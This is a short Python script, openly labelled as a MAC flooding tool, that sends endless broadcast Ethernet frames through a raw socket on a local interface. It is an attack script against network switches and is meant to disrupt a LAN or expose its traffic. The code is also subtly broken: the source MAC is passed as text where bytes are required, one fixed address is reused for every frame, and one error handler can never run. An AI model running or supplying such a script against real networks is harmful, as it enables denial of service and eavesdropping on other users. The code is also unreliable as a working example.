import socket
import struct
import random

def random_mac():
    return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

def main ():
    interface = "eth0"
    dst_mac = bytes.fromhex("ff:ff:ff:ff:ff:ff".replace(":", ""))
    src_mac = random_mac()
    eth_type = 0x0900
    payload = "garbage value ".encode() * 10

    frame = struct.pack("!6s6sH", dst_mac, src_mac, eth_type) + payload

    try:
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as raw_socket:
            raw_socket.bind((interface, 0))
            while True:                                                             
                raw_socket.send(frame)
    except KeyboardInterrupt:
        print("Stopping MAC flooding...")  
    except Exception as error:
        print(f"An error occurred: {error}")
    except PermissionError:
        print("Permission denied: You need to run this script with elevated privileges (e.g., as root).")
if __name__ == "__main__":    main()
    
